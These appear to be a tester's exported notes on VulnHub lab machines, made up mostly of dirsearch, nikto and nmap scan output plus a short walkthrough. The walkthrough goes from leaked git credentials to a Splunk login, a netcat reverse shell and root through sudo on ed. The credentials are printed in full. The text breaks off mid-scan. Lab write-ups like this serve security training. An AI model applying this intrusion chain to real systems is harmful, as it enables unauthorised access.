class='title level-5'>dirsearch</h1><br/><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-18_15-24-30.log<br /><br />Target: http://192.168.11.252:1337<br /><br />[15:24:30] Starting: <br />[15:24:30] 403 -  287B  - /.php<br />[15:24:30] 200 -    1KB - /images/<br />[15:24:30] 403 -  289B  - /icons/      <br />[15:28:26] 403 -  297B  - /server-status/                                                <br />                                                                                                       <br />Task Completed<br />root@kali:~/Desktop/Machines/VulnHub/LOTR# dirsearch <a href="http://192.168.11.252:1337/978345210">http://192.168.11.252:1337/978345210</a><br /><br /><br /><br /><br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-18_15-53-16.log<br /><br />Target: http://192.168.11.252:1337/978345210/<br /><br />[15:53:16] Starting: <br />[15:53:16] 200 -  485B  - /978345210/index.php<br />[15:53:16] 403 -  297B  - /978345210/.php<br />[15:53:16] 200 -    0B  - /978345210/login.php<br />[15:53:16] 302 -  262B  - /978345210/profile.php  -&gt;  index.php<br />[15:53:19] 302 -    0B  - /978345210/logout.php  -&gt;  index.php<br />                                                                <br />Task Completed<br />root@kali:~/Desktop/Machines/VulnHub/LOTR# <br /><br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.252<br />+ Target Hostname:    192.168.11.252<br />+ Target Port:        1337<br />+ Start Time:         2019-10-18 15:24:29 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.7 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ IP address found in the &#39;location&#39; header. The IP is &quot;127.0.1.1&quot;.<br />+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is &quot;127.0.1.1&quot;.<br />+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS <br />+ OSVDB-3268: /images/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 7917 requests: 0 error(s) and 9 item(s) reported on remote host<br />+ End Time:           2019-10-18 15:25:24 (GMT-4) (55 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-3'>Sputnik</h1><br/>nmap showed that 8089,8189,55555,61337 were all open and http<br />61337 was running splunk (no dice until creds)<br />8089 and 8189 were duds (no nikto responce) probably ingest ports for splunk<br />55555 was a .git project flappy (flappybird)<br />In the .git Head I was able to find the repo and I downloaded it.<br />in the repo I did the log and stuff and was able to find the creds sputnik:ameer_says_thank_you_and_good_job<br />I was able to log into splunk with this!!!<br />Now I went to <a href="https://www.n00py.io/2018/10/popping-shells-on-splunk/">https://www.n00py.io/2018/10/popping-shells-on-splunk/</a> <br />USE NETCAT TO HANDLE THE SHELL<br />from here I used the ??shell super fucked?? line and was able to get a better shell<br />sudo -l showed that I could run ed as root<br />gtfo bins... and BOOM<br />root!!!!!!</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>nmap -sC -sV -p-  192.168.11.250 <br /><br /><br />sputnik:ameer_says_thank_you_and_good_job</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/Sputnik# nmap -sC -sV -p-  192.168.11.250 <br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-18 19:05 EDT<br />Nmap scan report for 192.168.11.250<br />Host is up (0.00025s latency).<br />Not shown: 65531 closed ports<br />PORT      STATE SERVICE         VERSION<br />8089/tcp  open  ssl/http        Splunkd httpd<br />| http-robots.txt: 1 disallowed entry <br />|_/<br />|_http-server-header: Splunkd<br />|_http-title: splunkd<br />| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser<br />| Not valid before: 2019-03-29T11:03:21<br />|_Not valid after:  2022-03-28T11:03:21<br />8191/tcp  open  limnerpressure?<br />| fingerprint-strings: <br />|   FourOhFourRequest, GetRequest: <br />|     HTTP/1.0 200 OK<br />|     Connection: close<br />|     Content-Type: text/plain<br />|     Content-Length: 85<br />|_    looks like you are trying to access MongoDB over HTTP on the native driver port.<br />55555/tcp open  http            Apache httpd 2.4.29 ((Ubuntu))<br />| http-git: <br />|   192.168.11.250:55555/.git/<br />|     Git repository found!<br />|_    Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: Flappy Bird Game<br />61337/tcp open  http            Splunkd httpd<br />| http-robots.txt: 1 disallowed entry <br />|_/<br />|_http-server-header: Splunkd<br />| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />|_Requested resource was http://192.168.11.250:61337/en-US/account/login?return_to=%2Fen-US%2F<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br />SF-Port8191-TCP:V=7.70%I=7%D=10/18%Time=5DAA4560%P=i686-pc-linux-gnu%r(Get<br />SF:Request,A9,&quot;HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-T<br />SF:ype:\x20text/plain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like\<br />SF:x20you\x20are\x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20o<br />SF:n\x20the\x20native\x20driver\x20port\.\r\n&quot;)%r(FourOhFourRequest,A9,&quot;HT<br />SF:TP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-Type:\x20text/p<br />SF:lain\r\nContent-Length:\x2085\r\n\r\nIt\x20looks\x20like\x20you\x20are\<br />SF:x20trying\x20to\x20access\x20MongoDB\x20over\x20HTTP\x20on\x20the\x20na<br />SF:tive\x20driver\x20port\.\r\n&quot;);<br />MAC Address: 00:0C:29:36:B9:73 (VMware)<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 59.20 seconds<br /></div><div class='page'><h1 class='title level-6'>8089</h1><br/></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-18_19-09-49.log<br /><br />Target: http://192.168.11.250:8089<br /><br />CONNECTION TIMEOUT: There was a problem in the request to: <br /><br />Task Completed<br />root@kali:~/Desktop/Machines/VulnHub/Sputnik# <br /><br /><br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>+ Target Hostname:    192.168.11.250<br />+ Target Port:        8089<br />---------------------------------------------------------------------------<br />+ SSL Info:        Subject:  /CN=SplunkServerDefaultCert/O=SplunkUser<br />                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384<br />                   Issuer:   /C=US/ST=CA/L=San Francisco/O=Splunk/CN=SplunkCommonCA/emailAddress=support@splunk.com<br />+ Start Time:         2019-10-18 19:09:48 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Splunkd<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.<br />+ The site uses SSL and Expect-CT header is not present.<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Hostname &#39;192.168.11.250&#39; does not match certificate&#39;s names: SplunkServerDefaultCert<br />+ Allowed HTTP Methods: GET, POST, HEAD, OPTIONS <br />+ 8074 requests: 7 error(s) and 5 item(s) reported on remote host<br />+ End Time:           2019-10-18 19:16:54 (GMT-4) (426 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/VulnHub/Sputnik# </div><div class='page'><h1 class='title level-6'>8189</h1><br/></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-18_19-09-49.log<br /><br />Target: http://192.168.11.250:8189<br /><br />CONNECTION TIMEOUT: There was a problem in the request to: <br /><br />Task Completed<br />root@kali:~/Desktop/Machines/VulnHub/Sputnik# <br /><br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ No web server found on 192.168.11.250:8189<br />---------------------------------------------------------------------------<br />+ 0 host(s) tested<br />root@kali:~/Desktop/Machines/VulnHub/Sputnik# <br /><br /></div><div class='page'><h1 class='title level-6'>55555</h1><br/></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.250<br />+ Target Hostname:    192.168.11.250<br />+ Target Port:        55555<br />+ Start Time:         2019-10-18 19:09:48 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.29 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Server may leak inodes via ETags, header found with file /, inode: 1e9a, size: 5853b5bd5eda4, mtime: gzip<br />+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS <br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.<br />+ /.git/HEAD: Git HEAD file found. Full repo details may be present.<br />+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.<br />+ 7917 requests: 0 error(s) and 10 item(s) reported on remote host<br />+ End Time:           2019-10-18 19:10:11 (GMT-4) (23 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/VulnHub/Sputnik# <br /></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-18_19-09-49.log<br /><br />Target: http://192.168.11.250:55555<br /><br />[19:09:49] Starting: <br />[19:09:50] 403 -  298B  - /icons/      <br />[19:15:23] 403 -  306B  - /server-status/                                  <br />78.65% - Errors: 853 - Last request to: newslog.php                 <br /><br /><br /></div><div class='page'><h1 class='title level-6'>61337</h1><br/></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041                                                                                                                                                                                        <br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-18_19-09-49.log                                                                                                                                                                                       <br /><br />Target: http://192.168.11.250:61337                                                                                                                                                                                         <br /><br />[19:09:49] Starting:                                                                                                                                                <br />[19:09:58] 303 -  184B  - /en-US/                                                                                                                                                                                                                                <br />[19:10:00] 303 -  184B  - /en-us/                                                                                                                                                                                                                                <br />[19:10:02] 303 -  184B  - /en_US/                                                                                                                                                                                                                                <br />[19:10:05] 303 -  184B  - /zh-cn/                                                                                                                                                                                                                                <br />[19:10:40] 303 -  184B  - /en_us/                                                                                                                                                                                                                                <br />[19:10:49] 303 -  184B  - /en_GB/                                                                                                                                                                                                                                <br />[19:10:53] 303 -  184B  - /en-gb/                                                                                                                                                                                                                                <br />[19:10:53] 303 -  184B  - /zh_cn/                                                                                                                                                                                                                                <br />[19:10:54] 303 -  184B  - /zh_tw/                                                                                                                                                                                                                                <br />[19:11:34] 303 -  184B  - /zh-CN/                                                                                                                                                                                                                                <br />[19:11:36] 303 -  184B  - /zh-tw/                                                                                                                                                                                                                                <br />[19:12:10] 303 -  425B  - /DisablingAutomaticPrivateIPAddressing.php                                                                                                                                                                                             <br />[19:12:11] 303 -  435B  - /DisablingSystemSpeakerOutputfromVirtualServer/                                                                                                                                                                                        <br />[19:12:11] 303 -  441B  - /DisablingSystemSpeakerOutputfromVirtualServer.php                                                                                                                                                                                     <br />[19:12:17] 303 -  184B  - /de_DE/                                                                                                                                                                                                                                <br />[19:12:24] 303 -  411B  - /GlobalMultichannelGraphicsGrey.php                                                                                                                                                                                                    <br />[19:12:27] 303 -  184B  - /en-GB/                                                                                                                                                                                                                                <br />[19:12:34] 303 -  421B  - /MSNBC10%20section%20front%20headers.php                                                                                                                                                                                               <br />[19:12:34] 303 -  431B  - /RemoteDesktopclientforWindows2000NTWin9x.php                                                                                                                                                                                          <br />[19:12:34] 303 -  425B  - /RemoteDesktopclientforWindows2000NTWin9x/                                                                                                                                                                                             <br />[19:12:34] 303 -  417B  - /WindowsXPCommonProblemsandGotchas.php                                                                                                                                                                                                 <br />[19:12:34] 303 -  433B  - /RecoverLostWindowsNTAdministratorPassword.php                                                                                                                                                                                         <br />[19:12:34] 303 -  427B  - /RecoverLostWindowsNTAdministratorPassword/                                                                                                                                                                                            <br />[19:12:35] 303 -  405B  - /ApplicationSecurityAssessments/                                                                                                                                                                                                       <br />[19:12:35] 303 -  417B  - /J2EEandDotNetsecurityByGerMulcahy.php                                                                                                                                                                                                 <br />[19:12:50] 303 -  184B  - /de-de/                                                                                                                                                                                                                                <br />[19:12:59] 303 -  421B  - /Norton%20Internet%20Security%202006.php                                                                                                                                                                                               <br />[19:12:59] 303 -  415B  - /Norton%20Internet%20Security%202006/                                                                                                                                                                                                  <br />[19:13:11] 303 -  411B  - /TroubleshootingStartupProblems.php                                                                                                                                                                                                    <br />[19:13:22] 303 -  415B  - /NewspapersFromMultipleCategories.php                                                                                                                                                                                                  <br />[19:13:24] 303 -  184B  - /zh_CN/                                                                                                                                                                                                                                <br />[19:13:46] 303 -  419B  - /Need%20for%20Speed%20Most%20Wanted.php                                                                                                                                                                                                <br />[19:13:46] 303 -  413B  - /Need%20for%20Speed%20Most%20Wanted/                                                                                                                                                                                                   <br />[19:14:18] 303 -  415B  - /MyNewJobRecommendationsOrganized.php                                                                                                                                                                                                  <br />[19:14:37] 303 -  429B  - /TransparentScreenLockforWindows2000NTXP.php                                                                                                                                                                                           <br />[19:14:37] 303 -  423B  - /TransparentScreenLockforWindows2000NTXP/                                                                                                                                                                                              <br />[19:14:38] 303 -  435B  - /EnableDisableTaskManagerinWindowsXPHomePro.php                                                                                                                                                                                        <br />[19:14:38] 303 -  429B  - /EnableDisableTaskManagerinWindowsXPHomePro/                                                                                                                                                                                           <br />[19:14:38] 303 -  437B  - /RegistryTipWindowsNTNTFSLastAccessTimeStamp.php                                                                                                                                                                                       <br />[19:14:38] 303 -  431B  - /RegistryTipWindowsNTNTFSLastAccessTimeStamp/                                                                                                                                                                                          <br />[19:14:45] 303 -  415B  - /Check%20All%20Tracker%20Features%21/                                                                                                                                                                                                  <br />[19:14:46] 303 -  413B  - /berufsunfaehigkeitsversicherung.php                                                                                                                                                                                                   <br />[19:14:49] 303 -  184B  - /fr_FR/                                                                                                                                                                                                                                <br />[19:15:08] 303 -  184B  - /it-it/                                                                                                                                                                                                                                <br />[19:15:19] 303 -  423B  - /HowtohackarticlesandHackingTutorials.php                                                                                                                                                                                              <br />[19:15:19] 303 -  417B  - /HowtohackarticlesandHackingTutorials/                                                                                                                                                                                                 <br />[19:15:19] 303 -  415B  - /Howhackershidetheiridentityindex.php                                                                                                                                                                                                  <br />[19:15:19] 303 -  409B  - /Howhackershidetheiridentityindex/                                                                                                                                                                                                     <br />[19:15:19] 303 -  419B  - /PopularGeneralNetworkSecurityLinks.php                                                                                                                                                                                                <br />[19:15:19] 303 -  413B  - /PopularGeneralNetworkSecurityLinks/                                                                                                                                                                                                   <br />[19:15:19] 303 -  455B  - /NetworkSecurityArticlesAndHackingPreventionResources.                                                                                                                                                                                 php                                                                                         <br />[19:15:19] 303 -  449B  - /NetworkSecurityArticlesAndHackingPreventionResources/             <br />[19:15:27] 303 -  429B  - /HoneypotsDefinitionsandValueofHoneypots.php                                                                                                                                                                                           <br />[19:15:27] 303 -  423B  - /HoneypotsDefinitionsandValueofHoneypots/                                                                                                                                                                                              <br />[19:15:27] 303 -  417B  - /RainbowSeriesLibraryTheOneTheOnly.php                                                                                                                                                                                                 <br />[19:15:27] 303 -  411B  - /RainbowSeriesLibraryTheOneTheOnly/                                                                                                                                                                                                    <br />[19:15:27] 303 -  415B  - /GettingIPdatafromnumeroussources.php                                                                                                                                                                                                  <br />[19:15:27] 303 -  449B  - /DonaldPipkinsSecurityTipsfortheWeekofDecember23rd.php                                                                                                                                                                                 <br />[19:15:27] 303 -  443B  - /DonaldPipkinsSecurityTipsfortheWeekofDecember23rd/                                                                                                                                                                                    <br />[19:15:27] 303 -  433B  - /THELATESTINDENIALOFSERVICEATTACKSSMURFING.php                                                                                                                                                                                         <br />[19:15:27] 303 -  427B  - /THELATESTINDENIALOFSERVICEATTACKSSMURFING/                                                                                                                                                                                            <br />[19:15:27] 303 -  447B  - /Thedangersofftpconversionsonmisconfiguredsystems.php                                                                                                                                                                                  <br />[19:15:27] 303 -  441B  - /Thedangersofftpconversionsonmisconfiguredsystems/                                                                                                                                                                                     <br />[19:15:27] 303 -  431B  - /Windows9xMeSecurityandSystemRestrictions.php                                                                                                                                                                                          <br />[19:15:27] 303 -  425B  - /Windows9xMeSecurityandSystemRestrictions/                                                                                                                                                                                             <br />[19:15:27] 303 -  455B  - /HowToEliminateTheTenMostCriticalInternetSecurityThrea                                                                                                                                                                                 ts/                                                                                         <br />[19:15:27] 303 -  461B  - /HowToEliminateTheTenMostCriticalInternetSecurityThrea                                                                                                                                                                                 ts.php                                                                                                  <br />[19:15:27] 303 -  439B  - /DefaultLoginsandPasswordsforNetworkedDevices.php                                                                                                                                                                                      <br />[19:15:27] 303 -  433B  - /DefaultLoginsandPasswordsforNetworkedDevices/                                                                                                                                                                                         <br />[19:15:27] 303 -  417B  - /ABeginnersGuideToWirelessSecurity.php                                                                                                                                                                                                 <br />[19:15:27] 303 -  421B  - /MicrosoftBaselineSecurityAnalyzerV1.php                                                                                                                                                                                               <br />[19:15:27] 303 -  415B  - /MicrosoftBaselineSecurityAnalyzerV1/                                                                                                                                                                                                  <br />[19:15:27] 303 -  411B  - /ProtectingFileswithWindowsNTXP.php                                                                                                                                                                                                    <br />[19:15:28] 303 -  451B  - /ProtectionoftheAdministratorAccountintheOfflineSAM.ph                                                                                                                                                                                 p                                                                                   <br />[19:15:28] 303 -  445B  - /ProtectionoftheAdministratorAccountintheOfflineSAM/                                                                                                                                                                                   <br />[19:15:28] 303 -  437B  - /ImprovingtheSecurityofYourSitebyBreakingIntoit/                                                                                                                                                                                       <br />[19:15:28] 303 -  431B  - /Placesthatvirusesandtrojanshideonstartup.php                                                                                                                                                                                          <br />[19:15:28] 303 -  425B  - /Placesthatvirusesandtrojanshideonstartup/                                                                                                                                                                                             <br />[19:15:28] 303 -  443B  - /ImprovingtheSecurityofYourSitebyBreakingIntoit.php                                                                                                                                                                                    <br />[19:15:28] 303 -  415B  - /LinksysRouterInformationAcollection/                                                                                                                                                                                                  <br />[19:15:28] 303 -  427B  - /DatabaseSecurityinHighRiskEnvironments.php                                                                                                                                                                                            <br />[19:15:28] 303 -  439B  - /SQLInjectionModesofAttackDefenceandWhyItMatters/                                                                                                                                                                                      <br />[19:15:28] 303 -  445B  - /SQLInjectionModesofAttackDefenceandWhyItMatters.php                                                                                                                                                                                   <br />[19:15:28] 303 -  421B  - /DatabaseSecurityinHighRiskEnvironments/                                                                                                                                                                                               <br />[19:15:28] 303 -  417B  - /MakingYourNetworkSafeforDatabases.php                                                                                                                                                                                                 <br />[19:15:28] 303 -  465B  - /Databasesecurityprotectingsensitiveandcriticalinforma                                                                                                                                                                                 tion.php                                                                                                        <br />[19:15:28] 303 -  459B  - /Databasesecurityprotectingsensitiveandcriticalinforma                                                                                                                                                                                 tion/                                                                                               <br />[19:15:43] 303 -  437B  - /fid3D64E21C0E09F5D6216C4E4B1BB933AA6C6A9EB4.php                                                                                                                                                                                       <br />[19:15:43] 303 -  431B  - /fid3D64E21C0E09F5D6216C4E4B1BB933AA6C6A9EB4/                                                                                                                                                                                          <br />[19:15:43] 303 -  431B  - /fidC329AB67BE0B054B01C120F39045E770776E6329/                                                                                                                                                                                          <br />[19:15:43] 303 -  437B  - /fidC329AB67BE0B054B01C120F39045E770776E6329.php                                                                                                                                                                                       <br />[19:15:43] 303 -  431B  - /fidB2F0CA06F287B6F3E9F56E7FEBF9CEFB3838B618/                                                                                                                                                                                          <br />[19:15:43] 303 -  437B  - /fidB2F0CA06F287B6F3E9F56E7FEBF9CEFB3838B618.php                                                                                                                                                                                       <br />[19:15:43] 303 -  437B  - /fid2D0FF5DC055234955B14BCE98AEFC6255AD6BDE3.php                                                                                                                                                                                       <br />[19:15:43] 303 -  431B  - /fid2D0FF5DC055234955B14BCE98AEFC6255AD6BDE3/                                                                                                                                                                                          <br />[19:15:43] 303 -  431B  - /fid4CADF469919DF9D577A0D8977961DAE6E57A3C25/                                                                                                                                                                                          <br />[19:15:43] 303 -  437B  - /fid4CADF469919DF9D577A0D8977961DAE6E57A3C25.php                                                                                                                                                                                       <br />[19:15:43] 303 -  437B  - /fid1ADF3F9F3A9C01CD1D1C40B4108860919D2A56AC.php                                                                                                                                                                                       <br />[19:15:43] 303 -  431B  - /fid1ADF3F9F3A9C01CD1D1C40B4108860919D2A56AC/                                                                                                                                                                                          <br />[19:16:01] 303 -  423B  - /CommercialTelecommunicationsProvider.php                                                                                                                                                                                              <br />[19:16:01] 303 -  417B  - /CommercialTelecommunicationsProvider/                                                                                                                                                                                                 <br />[19:16:14] 303 -  429B  - /prenatalvitaminslinkedtohealthierbabies.php  <br /><br />[19:16:01] 303 -  423B  - /CommercialTelecommunicationsProvider.php                                                                                                                                                                                              <br />[19:16:01] 303 -  417B  - /CommercialTelecommunicationsProvider/                                                                                                                                                                                                 <br />[19:16:14] 303 -  429B  - /prenatalvitaminslinkedtohealthierbabies.php                                                                                                                                                                                           <br />[19:16:14] 303 -  423B  - /prenatalvitaminslinkedtohealthierbabies/                                                                                                                                                                                              <br />[19:16:15] 303 -  431B  - /Ken%20middletonUCCwithSSNsonMSsosSITEpdf.php                                                                                                                                                                                          <br />[19:16:15] 303 -  425B  - /Ken%20middletonUCCwithSSNsonMSsosSITEpdf/                                                                                                                                                                                             <br />[19:16:27] 303 -  439B  - /whatdoesyourbirthdatemeanforyourlovelifequiz.php                                                                                                                                                                                      <br />[19:16:27] 303 -  403B  - /whatsyourpizzapersonalityquiz/                                                                                                                                                                                                        <br />[19:16:27] 303 -  415B  - /whatanimalwereyouinapastlifequiz.php                                                                                                                                                                                                  <br />[19:16:27] 303 -  433B  - /whatdoesyourbirthdatemeanforyourlovelifequiz/                                                                                                                                                                                         <br />[19:16:27] 303 -  409B  - /whatanimalwereyouinapastlifequiz/                                                                                                                                                                                                     <br />[19:16:27] 303 -  423B  - /whatmovieisyourchristmasmostlikequiz.php                                                                                                                                                                                              <br />[19:16:27] 303 -  417B  - /whatmovieisyourchristmasmostlikequiz/                                                                                                                                                                                                 <br />[19:16:27] 303 -  413B  - /whoshouldyouhavevotedforin2004quiz/                                                                                                                                                                                                   <br />[19:16:29] 303 -  409B  - /64356135653039353435383166306330/                                                                                                                                                                                                     <br />[19:17:12] 303 -  413B  - /STOP%20Fact%20sheet%20April%202006/                                                                                                                                                                                                   <br />[19:17:17] 303 -  409B  - /c097c40d3f9a53ff5c7ddfc2f7f1c05c/                                                                                                                                                                                                     <br />[19:17:23] 303 -  433B  - /Newsgroup%20Crowds%20and%20Author%20Lines.php                                                                                                                                                                                         <br />[19:17:23] 303 -  427B  - /Newsgroup%20Crowds%20and%20Author%20Lines/                                                                                                                                                                                            <br />[19:17:23] 303 -  455B  - /The%20Social%20Life%20of%20Small%20Graphical%20Chats.                                                                                                                                                                                 php                                                                                         <br />[19:17:23] 303 -  449B  - /The%20Social%20Life%20of%20Small%20Graphical%20Chats/                                                                                                                                                                                 <br />[19:17:23] 303 -  423B  - /Invisible%20Crowds%20in%20Cyberspace.php                                                                                                                                                                                              <br />[19:17:23] 303 -  445B  - /chat%20as%20a%20streaming%20media%20data%20type.php                                                                                                                                                                                   <br />[19:17:23] 303 -  439B  - /chat%20as%20a%20streaming%20media%20data%20type/                                                                                                                                                                                      <br />[19:17:25] 303 -  403B  - /Police%20State%20of%20America/                                                                                                                                                                                                        <br />[19:17:28] 303 -  423B  - /HomeConstructionAlternativeConstruction/                                                                                                                                                                                              <br />[19:17:28] 303 -  429B  - /HomeConstructionAlternativeConstruction.php                                                                                                                                                                                           <br />[19:17:37] 303 -  409B  - /64356135653039353435613034323230/                                                                                                                                                                                                     <br />[19:17:37] 303 -  409B  - /64356135653039353435613034616530/                                                                                                                                                                                                     <br />[19:17:38] 303 -  409B  - /64356135653039353435613033613530/                                                                                                                                                                                                     <br />[19:17:45] 303 -  425B  - /1026c47176b05868242613e0869e9cf71c8425d0/                                                                                                                                                                                             <br />[19:17:48] 303 -  409B  - /63646263373534393435386631383830/                                                                                                                                                                                                     <br />[19:17:48] 303 -  403B  - /cns%21C29701F38A601141%211307/                                                                                                                                                                                                        <br />[19:17:50] 303 -  409B  - /0000BDF20016F5DD0106E01622BE22F7/                                                                                                                                                                                                     <br />[19:17:50] 303 -  409B  - /0000BDF20016F5DD010714BF3E1D9D73/                                                                                                                                                                                                     <br />[19:18:01] 303 -  471B  - /EA%20SPORTS%20CRICKET%202005%20WITH%20FULL%20INSTALL%                                                                                                                                                                                 20TOOLS.php                                                                                                                 <br />[19:18:01] 303 -  465B  - /EA%20SPORTS%20CRICKET%202005%20WITH%20FULL%20INSTALL%                                                                                                                                                                                 20TOOLS/                                                                                                        <br />[19:18:01] 303 -  449B  - /EA%20Sports%20Cricket%202005%20Crack%20mXtorrents.php                                                                                                                                                                                 <br />[19:18:01] 303 -  443B  - /EA%20Sports%20Cricket%202005%20Crack%20mXtorrents/                                                                                                                                                                                    <br />[19:18:01] 303 -  449B  - /Eagles%20John%20Mellencamp%20Video%20Value%20Pack.php                                                                                                                                                                                 <br />[19:18:01] 303 -  443B  - /Eagles%20John%20Mellencamp%20Video%20Value%20Pack/                                                                                                                                                                                    <br />[19:18:01] 303 -  421B  - /Eagles%20Complete%20greatest%20hits.php                                                                                                                                                                                               <br />[19:18:01] 303 -  415B  - /Eagles%20Complete%20greatest%20hits/                                                                                                                                                                                                  <br />[19:18:01] 303 -  435B  - /cacorder%20redhead%20gives%20hot%20blowjob.php                                                                                                                                                                                        <br />[19:18:01] 303 -  429B  - /cacorder%20redhead%20gives%20hot%20blowjob/                                                                                                                                                                                           <br />[19:18:01] 303 -  423B  - /Cable%20Modem%20Uncapping%20Kit%20V6.php                                                                                                                                                                                              <br />[19:18:02] 303 -  459B  - /Da%20Vinci%20and%20the%20Code%20He%20Lived%20By%20KIS                                                                                                                                                                                 S.php                                                                                               <br />[19:18:02] 303 -  453B  - /Da%20Vinci%20and%20the%20Code%20He%20Lived%20By%20KIS                                                                                                                                                                                 S/                                                                                      <br />[19:18:02] 303 -  403B  - /E%20N%20S%20L%20A%20V%20E%20D/                                                                                                                                                                                                        <br />[19:18:04] 303 -  519B  - /FA%20Cup%20Man%20U%20vs%20Newcastle%20170405%20Englis                                                                                                                                                                                 h%20comm%20DivX%20second%20half.php                                                                                                                                                                                         <br />[19:18:04] 303 -  513B  - /FA%20Cup%20Man%20U%20vs%20Newcastle%20170405%20Englis                                                                                                                                                                                 h%20comm%20DivX%20second%20half/                                                                                                                                                                                <br />[19:18:04] 303 -  497B  - /FA%20Cup%20Arsenal%20vs%20Sheffield%20United%20Feb%20                                                                                                                                                                                 19%2005%202nd%20half.php                                                                                                                                                        <br />[19:18:04] 303 -  491B  - /FA%20Cup%20Arsenal%20vs%20Sheffield%20United%20Feb%20                                                                                                                                                                                 19%2005%202nd%20half/                                                                                                                                               <br />[19:18:04] 303 -  497B  - /FA%20Cup%20Arsenal%20vs%20Sheffield%20United%20Feb%20        <br />[19:18:04] 303 -  569B  - /FA%20Community%20Shield%20Arsenal%20v%20Chelsea%201st                                                                                                                                                                                 %20Half%207th%20August%202005%20352x288%20Xvid%20English.php                                                                                                                                                                                                     <br />[19:18:05] 303 -  421B  - /F1%20Racing%203d%20Screensaver%20v1.php                                                                                                                                                                                               <br />[19:18:05] 303 -  419B  - /F1%20Racing%203d%20Screensaver%201.php                                                                                                                                                                                                <br />[19:18:05] 303 -  419B  - /fullalbumstreambingcrosbychristmas.php                                                                                                                                                                                                <br />[19:18:05] 303 -  413B  - /fullalbumstreambingcrosbychristmas/                                                                                                                                                                                                   <br />[19:18:05] 303 -  423B  - 